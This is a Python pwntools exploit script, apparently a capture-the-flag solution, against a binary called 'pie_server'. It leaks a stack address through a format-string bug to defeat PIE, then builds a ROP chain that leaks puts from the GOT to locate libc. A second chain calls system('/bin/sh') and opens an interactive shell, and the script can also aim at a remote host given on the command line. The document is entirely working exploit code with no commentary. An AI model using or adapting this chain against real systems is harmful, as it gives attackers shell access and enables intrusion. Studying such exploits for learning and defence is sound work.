from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = """
# b *(0x555555554000+0x11ce)
c
""".format(
    **locals()
)


# Set up pwntools for the correct architecture
exe = "./pie_server"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = "debug"

print(hex(libc.symbols.puts))
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

offset = 264
io.sendlineafter(b":", b"%15$p")
io.recvuntil(b"Hello")
leaked_addr = int(io.recvline(), 16)
elf.address = leaked_addr - 0x1224
info("piebase=%#x", elf.address)
pop_rdi_offset = elf.address + 0x12AB

payload = flat(
    {
        offset: [
            pop_rdi_offset,
            elf.got.puts,
            elf.plt.puts,
            elf.symbols.vuln,
        ]
    }
)
io.sendlineafter(b':P', payload)
info("-----------------------------------")
# io.recvlines()
data = io.recvn(9)
info(hexdump(data.strip().ljust(8, b'\x00')))
got_puts = u64(data.strip().ljust(8, b'\x00'))
info("got_puts=%#x", got_puts)
info("-----------------------------------")

libc_base = got_puts - libc.symbols.puts
info("libc_base=%#x", libc_base)

libc.address = libc_base
info("puts=%#x", libc.symbols.puts)
info("system=%#x", libc.symbols.system)
bin_sh = next(libc.search(b'/bin/sh'))
info("'/bin/sh'=%#x", bin_sh)

payload = flat(
    {
        offset: [
            pop_rdi_offset,
            bin_sh,
            elf.address + 0x1016, # stack align  https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call
            libc.symbols.system,
        ]
    }
)

io.sendline(payload)
io.sendline("ls\n")

io.interactive()
